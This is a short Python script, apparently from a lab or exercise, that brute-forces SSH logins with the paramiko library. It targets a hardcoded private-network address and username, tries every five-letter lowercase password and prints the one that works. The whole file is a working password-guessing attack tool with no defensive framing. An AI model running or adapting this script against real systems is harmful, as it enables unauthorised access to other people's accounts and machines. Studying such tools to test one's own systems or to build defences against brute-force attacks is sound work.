import sys
from string import ascii_lowercase
import socket
import paramiko

global host
global username
global port

host = "172.16.0.30"
username = "sigurdkb"
port = 22

sock = socket.error
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())


def ssh_connection(password, status=0):
    try:
        ssh.connect(host, port=port, username=username, password=password)
    except paramiko.AuthenticationException:
        status = 1
    except sock:
        status = 2

    ssh.close()
    return status


def program(password):
    response = ssh_connection(password)

    if response == 0:
        print("++ Password found: " + password)
        sys.exit(0)
    elif response == 1:
        print("-- Password incorrect: " + password)
    elif response == 2:
        print("!! Cannot connect to host: " + host)
        sys.exit(0)


for a in ascii_lowercase:
    for b in ascii_lowercase:
        for c in ascii_lowercase:
            for d in ascii_lowercase:
                for e in ascii_lowercase:
                    program(a + b + c + d + e)


